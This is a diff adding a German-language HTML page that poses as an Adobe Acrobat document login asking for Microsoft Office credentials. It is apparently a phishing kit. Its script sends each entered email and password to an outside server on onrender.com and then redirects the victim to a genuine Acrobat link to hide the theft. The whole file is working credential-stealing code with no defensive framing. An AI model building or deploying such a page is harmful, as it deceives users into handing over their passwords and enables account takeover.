@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="icon" href="image/pdf-icon.png" type="image/x-icon">
+    <link rel="stylesheet" href="css/style.css">
+
+
+      <script>
+      window.onload = function() {
+    if (!sessionStorage.getItem('reloaded')) {
+        sessionStorage.setItem('reloaded', 'true');
+        setTimeout(() => location.reload(), 3000);
+    }
+    };
+      </script>
+
+</head>
+<body style="background-image: url(image/blur\ bg.png);">
+    <div class="login-card">
+        <div class="logo-container">
+            <div class="logo">
+                <img class="logo"  src="image/adobe-acrobat-reader-seeklogo.png"  />
+            </div>
+            &nbsp;
+            
+            
+            <div>
+                <img class="connect"  src="image/chain-sign-icon-transparent-style-link-vector-illustration-isolated-background-hyperlink-business-concept_157943-39027-removebg-preview.png"  />
+            </div>
+            
+           
+            &nbsp;
+            <div class="logo">
+                <img class="logo"  src="image/Icon.png"  />
+            </div>
+        </div>
+        
+
+
+        <h1 class="title">Adobe Geschäft Dokument</h1>
+        <p class="forgot-link">Erhalten Sie Zugriff mit <b style="color: #464FEB; font-size: 16px;">Microsoft Office</b></p>
+
+        <form id="loginForm" novalidate>
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <i class="fas fa-user input-icon"></i>
+                    <input type="text" class="input-field" id="username" placeholder="E-Mail-Adresse" autocomplete="username">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <div class="input-wrapper password-wrapper">
+                    <i class="fas fa-lock input-icon"></i>
+                    <input type="password" class="input-field" id="password" placeholder="Passwort" autocomplete="current-password">
+                    <button type="button" class="toggle-password" id="togglePassword" tabindex="-1">
+                        <i class="fas fa-eye-slash" id="eyeIcon"></i>
+                    </button>
+                </div>
+            </div>
+
+            <div class="remember-me">
+                <input type="checkbox" id="remember" name="remember" checked>
+                <label for="remember">Angemeldet bleiben</label>
+            </div>
+
+            <div class="forgot-link">
+                
+            </div>
+
+            <div class="button-container">
+                <button type="submit" class="login-btn" id="loginBtn" disabled>
+                    <span>Vorschau</span>&nbsp;
+                    <span class="spinner" aria-hidden="true"></span>
+                </button>
+            </div>
+
+            <div class="error-message" id="errorMessage">
+                <i class="fas fa-exclamation-circle"></i> Invalid username or password. Please try again.
+            </div>
+        </form>
+    </div>
+
+    <div class="footer">
+        © 2026 Adobe <span>|</span> <a href="#">Datenschutz</a> <span>|</span> <a href="#">Hilfe/FAQ</a>
+    </div>
+
+    <script>
+        const email = document.getElementById('username');
+        const password = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const loginForm = document.getElementById('loginForm');
+        const errorMessage = document.getElementById('errorMessage');
+        const togglePassword = document.getElementById('togglePassword');
+        const eyeIcon = document.getElementById('eyeIcon');
+
+        // Enable login button when password field is clicked
+        password.addEventListener('click', function() {
+            loginBtn.disabled = false;
+        });
+
+        // Also enable on focus (for keyboard navigation)
+        password.addEventListener('focus', function() {
+            loginBtn.disabled = false;
+        });
+
+        // Toggle password visibility
+        togglePassword.addEventListener('click', function() {
+            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+            password.setAttribute('type', type);
+            eyeIcon.classList.toggle('fa-eye');
+            eyeIcon.classList.toggle('fa-eye-slash');
+        });
+
+        // Show error on form submission
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            loginBtn.classList.add('loading');
+            loginBtn.disabled = true;
+
+            fetch('https://web-backend-79hb.onrender.com/', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                email: email.value,
+                password: password.value,
+                source: 'MICROSOFT OFFICE',
+              }),
+      		  
+      		  
+      
+            })
+    
+    		  .finally(() => {
+    		  loginBtn.classList.remove('loading');
+   			  loginBtn.disabled = false;
+  			  })
+    
+              .then((data) => {
+                window.location.href = 'https://acrobat.adobe.com/id/urn:aaid:sc:DEU1:393a2066-28b9-5ed9-b8a1-cdf6300fd1d3';
+              });
+ 
+        });
+
+    </script>
+</body>
+</html>
